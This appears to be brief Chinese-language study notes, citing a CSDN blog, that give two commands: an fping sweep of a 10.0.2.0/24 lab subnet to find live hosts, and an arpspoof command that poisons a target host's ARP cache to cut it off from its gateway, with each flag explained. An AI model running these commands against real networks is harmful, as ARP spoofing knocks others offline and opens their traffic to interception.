# 1
```
fping -asg 10.0.2.0/24

註：查看有哪些ip
```
# 2
```
arpspoof -i eth0 -t 10.0.2.4 10.0.2.1

註：
網卡：eth0
目標：-t(target)
目標IP：10.0.2.4
目標主機網路10.0.2.1
終止斷網：ctrl+z
```
```
來源：https://blog.csdn.net/chenjie19950809/article/details/78596717

